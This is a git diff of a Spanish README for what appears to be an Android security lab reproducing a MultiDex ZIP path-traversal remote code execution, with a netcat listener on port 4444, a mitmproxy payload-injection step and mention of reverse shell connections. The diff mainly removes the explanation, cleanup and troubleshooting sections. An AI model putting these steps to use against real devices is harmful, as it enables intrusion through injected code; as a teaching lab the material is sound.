@@ -53,24 +53,6 @@ file.copyTo(File(targetDir, "com.app.lab.rce-classes2.zip"))
 // 4. MultiDex carga automáticamente → RCE
 ```
 
-#### **Equivalencia Funcional:**
-
-| Path Traversal Real                           | Implementación Simulada                              |
-|-----------------------------------------------|------------------------------------------------------|
-| ZIP escribe directamente en `secondary-dexes` | ZIP extrae en `cacheDir` → copia a `secondary-dexes` |
-| Vulnerable a protecciones del OS              | Siempre funciona                                     |
-| Riesgo para el sistema host                   | Seguro para demostraciones                           |
-| **Resultado: DEX en secondary-dexes**         | **Resultado: DEX en secondary-dexes**                |
-
-### **Valor Educativo**
-
-Ambos enfoques demuestran el mismo concepto de seguridad:
-
-- ✅ **Vector de ataque**: ZIP malicioso con contenido controlado por atacante
-- ✅ **Vulnerabilidad**: MultiDex 1.0.1 carga automáticamente DEX desde `secondary-dexes`
-- ✅ **Impacto**: Ejecución remota de código sin interacción del usuario
-- ✅ **Mitigación**: Actualizar a versiones más recientes de MultiDex
-
 ## Requisitos
 
 ### **Software Necesario:**
@@ -136,8 +118,6 @@ nc -l 4444 &
 # Lanzar la aplicación
 adb shell am start -n com.app.lab.rce/.MainActivity
 
-# Monitorear logs del exploit
-adb logcat | grep -E "(RCE|AdUpdateService|NOWSECURE)"
 ```
 
 ## ¿Cómo saber si funcionó?
@@ -186,50 +166,5 @@ Una vez iniciada, la aplicación:
 - El exploit se ejecuta en el siguiente restart (patrón NowSecure 2017)
 - Cada ejecución crea nuevas conexiones de reverse shell
 
-## Limpieza
-
-Para resetear y probar desde cero:
-
-```bash
-# Limpiar datos de la app
-adb shell pm clear com.app.lab.rce
-
-# Remover configuración de proxy
-adb shell settings delete global http_proxy
-
-# Detener procesos background
-pkill -f mitmdump && pkill -f nc
-```
-
-## Troubleshooting
-
-### Problemas Comunes:
-
-**1. Error: "Android SDK not found"**
-
-```bash
-export ANDROID_HOME=/path/to/your/android/sdk
-```
-
-**2. Error: "No device connected"**
-
-```bash
-# Iniciar emulador
-emulator -avd YOUR_AVD_NAME
-```
-
-**3. Error: "mitmproxy not found"**
-
-```bash
-pip install mitmproxy
-```
-
-**4. El exploit no se ejecuta:**
-
-- Verificar que el proxy esté interceptando: `mitmdump -s mitmproxy/inject_payload.py -p 8090`
-- Verificar logs: `adb logcat | grep NOWSECURE`
-- Limpiar datos de la app: `adb shell pm clear com.app.lab.rce`
-
----
 
 **⚠️ Nota**: Este proyecto es solo para fines educativos y demostración de vulnerabilidades de seguridad. No usar para actividades maliciosas.
